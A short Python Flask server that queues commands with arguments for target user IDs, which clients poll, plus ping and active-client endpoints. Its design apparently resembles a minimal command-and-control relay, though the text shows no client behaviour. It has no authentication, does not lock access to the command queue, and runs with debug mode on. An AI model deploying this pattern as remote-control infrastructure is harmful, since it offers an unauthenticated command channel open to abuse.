from flask import Flask, request, jsonify
from threading import Lock
import time

lock = Lock()
app = Flask(__name__)
commands = {}
active_users = {}
PING_TIMEOUT = 10

@app.route('/send', methods=['POST'])
def send_command():
    data = request.get_json()
    target = data.get('to')
    command = {
        "command": data.get('command'),
        "args": data.get('args')
    }
    if not target or not command["command"]:
        return jsonify({"error": "invalid cmd data"}), 400
    if target not in commands:
        commands[target] = []
    commands[target].append(command)
    return jsonify({"status": "queued", "to": target})

@app.route('/poll/<userid>')
def poll(userid):
    cmds = commands.get(userid, [])
    commands[userid] = []
    return jsonify(cmds)


@app.route('/ping/<userid>', methods=['POST'])
def ping(userid):
    with lock:
        active_users[userid] = time.time()
    return jsonify({"status": "pong"})


@app.route('/active')
def get_active_users():
    now = time.time()
    active = [uid for uid, ts in active_users.items() if now - ts < PING_TIMEOUT]
    return jsonify(active)

if __name__ == '__main__':
    app.run(debug=True)
